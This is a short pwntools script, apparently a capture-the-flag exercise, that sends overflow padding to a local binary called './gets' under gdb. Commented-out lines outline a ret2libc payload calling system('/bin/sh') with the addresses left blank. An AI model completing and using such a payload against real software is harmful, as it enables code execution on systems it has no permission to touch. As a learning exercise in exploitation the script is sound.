#!/usr/bin/python
from pwn import *

s = process("./gets")
gdb.attach(s)

s.recvuntil("GIVE ME YOUR NAME!\n")

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"

# systemAddress = struct.pack("I", )
# binSH = struct.pack("I", )

# payload = padding + systemAddress + "AAAA" + binSH
s.sendline(padding)

s.wait_for_close()